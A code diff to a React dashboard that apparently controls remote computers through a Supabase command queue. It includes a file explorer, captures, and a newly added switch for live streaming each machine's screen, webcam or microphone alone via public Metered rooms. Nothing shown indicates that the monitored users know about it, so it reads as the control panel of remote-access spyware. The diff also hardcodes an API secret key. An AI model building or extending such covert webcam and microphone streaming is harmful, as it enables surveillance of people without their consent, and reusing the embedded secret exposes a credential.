@@ -36,6 +36,7 @@ export default function Dashboard() {
   const [zoomedImage, setZoomedImage] = useState<string | null>(null);
   const [isCapturing, setIsCapturing] = useState(false);
   const [countdown, setCountdown] = useState(10);
+  const [streamMode, setStreamMode] = useState<'screen' | 'webcam' | 'mic'>('screen');
   
   // File Explorer State
   const [explorerPath, setExplorerPath] = useState("C:\\");
@@ -378,26 +379,21 @@ export default function Dashboard() {
     setTimeout(() => fetchFiles(explorerPath), 2000);
   };
 
-  const startLiveStream = async (pcId: string, pcName: string) => {
+  const startLiveStream = async (pcId: string, pcName: string, mode: 'screen' | 'webcam' | 'mic' = 'screen') => {
     setSelectedPc(pcId);
     setSelectedPcName(pcName);
+    setStreamMode(mode);
     const roomName = 'k' + pcId.replace(/-/g, '').substring(0, 12);
     try {
-      const roomName = 'k' + pcId.replace(/-/g, '').substring(0, 12);
       const secretKey = 'aoGqhdUx0-0GdtuP5zhL6hSDiW8SLRwv80ME3HF_cesDvDrx';
-      
       await fetch(`https://kerchak.metered.live/api/v1/room?secretKey=${secretKey}`, {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ 
-          roomName, 
-          privacy: 'public'
-        })
+        body: JSON.stringify({ roomName, privacy: 'public' })
       });
-    } catch(e) {
-      // Room already exists is fine, we just want to ensure it's there
-    }
-    await supabase.from('commands').insert({ computer_id: pcId, command: 'stream_start', args: roomName, status: 'pending' });
+    } catch(e) {}
+    // On passe le mode dans les args: "roomName|mode"
+    await supabase.from('commands').insert({ computer_id: pcId, command: 'stream_start', args: `${roomName}|${mode}`, status: 'pending' });
     setActiveModal('stream');
   };
 
@@ -616,10 +612,30 @@ export default function Dashboard() {
       )}
 
       {activeModal === 'stream' && (
-        <div className="fixed inset-0 z-[60] flex items-center justify-center bg-black/80 backdrop-blur-sm p-4">
-          <div className="bg-[#111] border border-white/10 rounded-xl overflow-hidden w-full max-w-6xl shadow-2xl">
-            <div className="flex justify-between items-center p-4 border-b border-white/10 bg-black/50"><h3 className="font-bold flex items-center gap-2 text-white"><Video className="text-green-400" size={18} /> Live Stream (Metered) - {selectedPcName}</h3><button onClick={() => { if(meteredMeeting) meteredMeeting.leaveMeeting(); setActiveModal(null); }} className="text-gray-400 hover:text-white"><X size={20} /></button></div>
-            <div className="p-6 flex flex-wrap gap-4 overflow-y-auto max-h-[80vh] items-center justify-center bg-[#0a0a0c]" id="stream-container"><div className="text-gray-500 py-10 flex flex-col items-center gap-3 w-full" id="stream-loading"><RefreshCw size={40} className="opacity-20 animate-spin" /><span>Waiting for client to connect...</span></div></div>
+        <div className="fixed inset-0 z-[60] flex items-center justify-center bg-black/90 backdrop-blur-md p-4">
+          <div className="bg-[#0c0c0c] border border-white/10 rounded-2xl overflow-hidden w-full max-w-6xl shadow-2xl flex flex-col h-[85vh]">
+            <div className="flex justify-between items-center p-4 border-b border-white/10 bg-black/50">
+              <div className="flex items-center gap-4">
+                <h3 className="font-bold flex items-center gap-2 text-white">
+                  <Video className="text-green-400" size={18} /> 
+                  Live - {selectedPcName} 
+                  <span className="text-[10px] bg-green-500/20 text-green-400 px-2 py-0.5 rounded uppercase ml-2 animate-pulse">{streamMode}</span>
+                </h3>
+                <div className="flex bg-white/5 p-1 rounded-lg border border-white/5 ml-4">
+                  <button onClick={() => startLiveStream(selectedPc!, selectedPcName!, 'screen')} className={`px-3 py-1 text-[10px] font-bold rounded-md transition-all ${streamMode === 'screen' ? 'bg-green-500 text-white shadow-[0_0_10px_rgba(34,197,94,0.4)]' : 'text-gray-500 hover:text-gray-300'}`}>SCREEN</button>
+                  <button onClick={() => startLiveStream(selectedPc!, selectedPcName!, 'webcam')} className={`px-3 py-1 text-[10px] font-bold rounded-md transition-all ${streamMode === 'webcam' ? 'bg-purple-500 text-white shadow-[0_0_10px_rgba(168,85,247,0.4)]' : 'text-gray-500 hover:text-gray-300'}`}>WEBCAM</button>
+                  <button onClick={() => startLiveStream(selectedPc!, selectedPcName!, 'mic')} className={`px-3 py-1 text-[10px] font-bold rounded-md transition-all ${streamMode === 'mic' ? 'bg-blue-500 text-white shadow-[0_0_10px_rgba(59,130,246,0.4)]' : 'text-gray-500 hover:text-gray-300'}`}>MIC ONLY</button>
+                </div>
+              </div>
+              <button onClick={() => { if(meteredMeeting) meteredMeeting.leaveMeeting(); setActiveModal(null); }} className="text-gray-400 hover:text-white"><X size={24} /></button>
+            </div>
+            <div className="flex-1 p-6 flex flex-wrap gap-4 overflow-y-auto items-center justify-center bg-[#050505] relative" id="stream-container">
+              <div className="absolute inset-0 bg-[radial-gradient(circle_at_50%_50%,rgba(34,197,94,0.03),transparent)] pointer-events-none"></div>
+              <div className="text-gray-500 py-10 flex flex-col items-center gap-3 w-full" id="stream-loading">
+                <RefreshCw size={40} className="opacity-20 animate-spin" />
+                <span className="text-xs font-bold tracking-widest uppercase">Initializing Stream Tunnel...</span>
+              </div>
+            </div>
           </div>
         </div>
       )}
